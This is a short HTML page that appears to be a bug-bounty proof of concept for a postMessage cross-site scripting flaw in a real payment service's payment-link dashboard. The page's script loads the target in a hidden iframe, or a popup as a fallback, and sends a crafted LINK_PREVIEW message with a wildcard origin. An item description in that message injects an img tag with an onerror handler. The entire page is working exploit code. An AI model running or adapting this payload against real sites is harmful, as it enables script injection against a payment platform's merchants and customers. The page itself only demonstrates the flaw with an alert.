<!DOCTYPE html>
<html>
<head>
  <title>postMessage PoC</title>
</head>
<body>
  <script>
    const targetUrl = 'http://app.squareup.com/dashboard/payment-links/new'; // ðŸ”¥ Replace this
    const payload = {
      name: 'LINK_PREVIEW',
      data: {
        type: 'INITIALIZE',
        uuid: 'poc-' + Date.now(),
        data: {
          checkout_link: {
            id: 'link-1',
            link_type: 'ITEM_LINK',
            checkout_link_data: {
              name: 'Product',
              link_type: 'ITEM_LINK',
              order_details: {
                line_items: [
                  { item_id: 'item-1', quantity: { quantity: 1 } }
                ]
              }
            }
          },
          related_objects: [{
            type: 'ITEM',
            id: 'item-1',
            item_data: {
              name: 'Product',
              description_html: '',
              description: '<img src=x onerror=alert(document.domain)>',
              variations: [{
                type: 'ITEM_VARIATION',
                id: 'var-1',
                item_variation_data: {
                  item_id: 'item-1',
                  name: 'Default',
                  pricing_type: 'FIXED_PRICING',
                  price_money: { amount: 1000, currency: 'USD' }
                }
              }]
            }
          }],
          settings: { checkout_title: 'Test Store' }
        }
      }
    };

    function sendPayload(targetWindow, origin = '*') {
      targetWindow.postMessage(payload, origin);
    }

    function tryIframe() {
      const iframe = document.createElement('iframe');
      iframe.src = targetUrl;
      iframe.style.display = 'none'; // hide iframe
      document.body.appendChild(iframe);

      iframe.onload = () => {
        try {
          sendPayload(iframe.contentWindow);
          console.log('Payload sent via iframe');
        } catch (err) {
          console.warn('iframe postMessage failed, falling back to window.open...');
          tryWindowOpen();
        }
      };

      // fallback if iframe never loads or is blocked
      setTimeout(() => {
        if (!iframe.contentWindow) {
          console.warn('iframe contentWindow not available');
          tryWindowOpen();
        }
      }, 3000);
    }

    function tryWindowOpen() {
      const win = window.open(targetUrl, '_blank');
      if (win) {
        setTimeout(() => {
          try {
            sendPayload(win);
            console.log('Payload sent via window.open');
          } catch (err) {
            console.error('Failed to send via window.open', err);
          }
        }, 2000); // wait for new window to load
      } else {
        console.error('Popup blocked or window.open failed');
      }
    }

    tryIframe();
  </script>
</body>
</html>
